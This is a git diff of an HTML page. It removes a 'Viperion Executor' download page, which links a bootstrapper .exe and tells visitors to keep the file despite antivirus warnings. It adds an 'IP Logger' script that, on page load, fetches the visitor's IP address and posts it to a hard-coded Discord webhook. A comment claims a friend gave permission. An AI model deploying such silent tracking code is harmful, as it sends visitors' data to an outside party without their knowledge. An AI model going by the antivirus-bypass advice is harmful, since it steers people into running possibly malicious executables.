@@ -3,53 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Viperion Executor</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            text-align: center;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            color: #4CAF50;
-            margin-bottom: 20px;
-        }
-        .download-button {
-            display: inline-block;
-            padding: 10px 20px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #4CAF50;
-            border: 2px solid #4CAF50;
-            border-radius: 4px;
-            text-decoration: none;
-            transition: background-color 0.3s, border-color 0.3s;
-        }
-        .download-button:hover {
-            background-color: #45a049;
-            border-color: #45a049;
-        }
-        p {
-            color: #666;
-            margin-top: 20px;
-        }
-    </style>
+    <title>IP Logger</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Viperion Executor</h1>
-        <a class="download-button" href="https://github.com/ZwiebelPro/-/raw/main/ViperionBootstrapper.exe" download>
-            Download ViperionBootstrapper
-        </a>
-        <p>If your browser or antivirus flags this as a false positive, press Ctrl+J and keep the file.</p>
-    </div>
+    <script>
+        async function logIPToDiscord() {
+            try {
+               
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                
+                await fetch('https://discordapp.com/api/webhooks/1265650819219324989/M6JCqIf1_g9hr_2fGQdfPm6uAinCdUJu1mVzgWv5FJNwsyvUOqwaJdOFDzdD1swwSrzY', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `IP Address: ${ip}`
+                    }),
+                });
+                
+                console.log('IP address sent to Discord:', ip);
+            } catch (error) {
+                console.error('Error fetching or sending IP address:', error);
+            }
+        }
+
+        
+// Dear Github, i was challanged to this, with legal permisson to my friend.
+
+
+        logIPToDiscord();
+    </script>
 </body>
 </html>
+
